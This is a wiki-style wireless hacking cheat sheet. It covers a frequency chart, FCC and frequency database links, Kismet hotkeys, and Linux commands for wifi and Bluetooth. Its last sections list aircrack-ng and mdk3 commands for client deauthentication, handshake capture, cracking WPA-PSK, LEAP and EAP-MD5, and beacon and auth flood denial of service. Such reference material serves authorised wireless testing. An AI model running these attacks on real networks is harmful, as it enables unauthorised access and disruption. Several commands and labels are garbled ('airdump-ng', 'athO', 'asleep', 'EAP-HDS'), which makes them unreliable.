---
title: Wireless
sidebar: mydoc_sidebar
permalink: wireless.html
folder: mydoc
---

# wireless

### Frequency chart

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Technology</b>
       </th>
       <th style="text-align:left"><b>Frequency</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">RFID</td>
       <td style="text-align:left">
         <p>120-150 kHz (LF)</p>
         <p>13.56 MHz (HF)</p>
         <p>433 MHz (lJHF)</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">Keyless Entry</td>
       <td style="text-align:left">
         <p>315 MHz (N. Am)</p>
         <p>433.92 MHz (Europe, Asia)</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">Cellular (US)</td>
       <td style="text-align:left">
         <p>698-894 MHz</p>
         <p>1710-1755 MHz</p>
         <p>1850-1910 MHz</p>
         <p>2110-2155 MHz</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">GPS</td>
       <td style="text-align:left">1227.60,1575.42 MHz</td>
     </tr>
     <tr>
       <td style="text-align:left">L Band</td>
       <td style="text-align:left">1-2 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">802.15.4 (ZigBee)</td>
       <td style="text-align:left">
         <p>868 MHz (Europe)</p>
         <p>915 MHz (lJS, Australia)</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">802.15.1 (Bluetooth)</td>
       <td style="text-align:left">2.4-2.483.5 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">802.11 b/g</td>
       <td style="text-align:left">2.4 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">802.11a</td>
       <td style="text-align:left">5.0 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">802.11 n</td>
       <td style="text-align:left">2.4/5.0 GHZ</td>
     </tr>
     <tr>
       <td style="text-align:left">C Band</td>
       <td style="text-align:left">4-8 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">Ku Band</td>
       <td style="text-align:left">12-18 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">K Band</td>
       <td style="text-align:left">18-26.5 GHz</td>
     </tr>
     <tr>
       <td style="text-align:left">Ka Band</td>
       <td style="text-align:left">26.5-40 GHz</td>
     </tr>
   </tbody>
</table>### Fcc id lookup

```text
https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm
```

### Database of frequencies

```text
http://www.radioreference.com/apps/db/
```

### Source of Kismet

| **Command** | **Explanation** |
| :--- | :--- |
| e| kismet servers |
| h Help
| | View full screen
| n Current network number
| | Remove the sound
| | Network details
| t| tag or remove the network tag
| | Linking network list
| g Grouping of tagged networks
| | Display the power levels of the wireless network card
| | Remove the group, the current group
| d Show displayable settings
| c Show current network users
| | Package rate chart
| L| Lock the channel in the selected channel
| a Show network statistics
| H| Back to the normal channel
| p| Receive package type
| +/- | Expand/collapse groups
| f Network Center
| CTRL+L | Display the page again
| w| Tracking alerts
| Q Exit Kismet |
| X Close the popup window

### wifi commands in linux

| command | Explanation
| :--- | :--- |
| iwconfig | Interface settings
| rfkill list | Show wifi problem
| rfkill unblock all | turn on wifi |
| airdump-ng mon0 | Monitoring of all interfaces

### Connected to an insecure network

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
dhclient ath0
```

### connect to wep

```text
iwconfig ath0 essid $SSID key
ifconfig ath0 up
dhclient ath0
```

### Connect to wpa-psk

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-psk.conf
dhclient ath0
```

### Connect to wpa-enterprise

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa supplicant -B -i ath0 -c wpa-ent.conf
dhclient ath0
```

## Bluetooth on Linux

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">hciconfig hci0 up</td>
       <td style="text-align:left">Turn on Bluetooth interface</td>
     </tr>
     <tr>
       <td style="text-align:left">hcitool -i hci0 scan --flush --all</td>
       <td style="text-align:left">Search for Bluetooth enabled devices</td>
     </tr>
     <tr>
       <td style="text-align:left">sdptool browse BD_ADDR</td>
       <td style="text-align:left">List of open services</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>hciconfig hci0 name &quot;NAME&quot; class Ox520204</p>
         <p>pi scan</p>
       </td>
       <td style="text-align:left">Select as discoverable</td>
     </tr>
     <tr>
       <td style="text-align:left">pand -K</td>
       <td style="text-align:left">Delete pand session</td>
     </tr>
   </tbody>
</table>

## Testing wifi networks in Linux

### Start monitor mode interface

```text
airmon-ng stop ath0
airmon-ng start wifi0
iwconfig ath0 channel $CH
```

### Capture client handshake attack

```text
airdump-ng -c $CH --bssid $AP -w file athO #Capture traffic
aireplay-ng -0 10 -a $AP -c $CH athO #Force client de-auth


```

### Brute force handshake attack

```text
aircrack-ng -w wordlist capture.cap # WPA-PSK
asleep -r capture.cap -w dict.asleep # LEAP
eapmd5pass -r capture.cap -w wordlist # EAP-HDS



```

### Dos attack

```text
mdk3 int a -a $AP #Auth Flood
mdk3 int b -c $CH #Beacon Flood
```


{% include links.html %}
